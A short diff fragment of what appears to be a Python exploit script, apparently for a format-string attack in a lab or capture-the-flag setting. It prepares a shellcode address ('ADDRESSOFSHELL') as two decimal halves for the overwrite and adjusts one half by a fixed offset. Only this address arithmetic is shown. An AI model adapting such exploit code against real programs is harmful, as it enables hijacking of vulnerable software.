@@ -16,7 +16,7 @@ ADDRESSOFSHELL = b'\xBF\xFF\xEA\x9D'
 ADDRESSOFSHELL = bytearray(ADDRESSOFSHELL)
 ADDRESSOFSHELL.reverse()
 ADDRESSOFSHELL = bytes(ADDRESSOFSHELL)
-ADDRESSOFSHELL1 = bytes(str(int.from_bytes(ADDRESSOFSHELL[0:2], 'big')), 'utf-8')
+ADDRESSOFSHELL1 = bytes(str(int.from_bytes(ADDRESSOFSHELL[0:2], 'big') - 2540), 'utf-8')
 ADDRESSOFSHELL2 = bytes(str(int.from_bytes(ADDRESSOFSHELL[2:], 'big')), 'utf-8')
 #print(ADDRESSOFSHELL1)
 
